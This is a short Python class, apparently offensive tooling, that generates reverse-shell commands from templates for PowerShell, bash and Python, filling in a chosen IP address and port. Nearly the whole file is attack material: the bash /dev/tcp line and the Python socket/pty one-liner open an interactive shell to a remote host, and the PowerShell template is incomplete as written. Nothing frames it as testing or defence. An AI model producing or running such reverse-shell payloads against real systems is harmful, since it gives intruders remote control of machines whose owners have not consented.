# Professional Payload Generation Engine
class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            "powershell_rev": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});",
            "bash_rev": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "python_rev": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        }

    def generate(self, p_type, ip, port):
        template = self.payloads.get(p_type)
        if template:
            return template.format(ip=ip, port=port)
        return "ERROR: Unknown payload type."

    def get_types(self):
        return list(self.payloads.keys())
